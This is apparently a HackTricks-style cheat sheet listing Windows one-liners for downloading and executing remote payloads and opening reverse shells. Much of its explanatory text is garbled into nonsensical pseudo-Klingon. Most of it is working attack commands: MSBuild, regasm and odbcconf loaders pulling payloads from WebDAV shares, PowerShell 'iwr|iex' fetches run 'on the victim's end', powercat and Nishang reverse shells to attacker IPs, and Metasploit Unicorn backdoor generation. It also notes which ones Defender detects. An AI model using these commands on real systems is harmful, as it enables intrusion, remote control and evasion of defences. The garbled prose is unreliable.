**tlhInganpu' jatlhlaHbe'chugh, Koadic zombie download & execute laH wmic stager.**

## Msbuild

* [ghaH](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
**Translation:**

**You can use this technique to bypass Application Whitelisting and Powershell.exe restrictions. As you will be prompted with a PS shell.\
Just download this and execute it: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)**
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**ghItlh**

## **CSC**

vItlhutlh C# code vItlhutlh vItlhutlh.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
**ghItlhvam**

* [ghItlhvam](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc) vItlhutlh.

**ghItlhvam**

* [ghItlhvam](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**jIyajbe'**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf

* [ghorgh](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**jIyajbe'** 

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershell Shells

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

In the **Shells** folder, there are a lot of different shells. To download and execute Invoke-_PowerShellTcp.ps1_, make a copy of the script and append to the end of the file:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Start serving the script in a web server and execute it on the victim's end:

Qa'vam script vItlhutlh web server 'ej vItlhutlh 'oH victim's end:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender jatlhpu'wI' jatlhpu' 'e' vItlhutlh (vaj, 3/04/2019).

**TODO: nISang shells lo'wI' jaH**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Download, web server vItlhutlh, listener vItlhutlh, 'ej vItlhutlh victim's end:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender jatlhpu'wI' malja' (vaj, 3/04/2019).

**powercat toQDuj:**

Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

**tlhIngan Hol:**

**Qapla'!** [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

**powershell** launcher yIlo'lu', **file** vItlhutlh je, **download** je **execute**.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Qa'leghvam vItlhutlh**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

unicorn vItlhutlh metasploit backdoor powershell version vItlhutlh.
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Qapla' msfconsole vItlhutlh!:

```
msfconsole -r created_resource.rc
```

vItlhutlh created_resource.rc jatlhqa'!
```
msfconsole -r unicorn.rc
```
Start a web server serving the _powershell\_attack.txt_ file and execute in the victim:

```
Invoke-WebRequest -Uri http://<attacker_ip>:<port>/powershell_attack.txt -OutFile C:\temp\powershell_attack.txt
```

This command will download the _powershell\_attack.txt_ file from the attacker's web server and save it to the victim's machine in the _C:\temp_ directory.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**QaD jImej**

## vItlhutlh

[PS>Attack](https://github.com/jaredhaight/PSAttack) PS console vItlhutlh offensive PS modules preloaded (cyphered)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) PS console vItlhutlh offensive PS modules proxy detection (IEX)

## References

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

vItlhutlh vulnerabilities 'oH vItlhutlh 'oH vItlhutlh. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
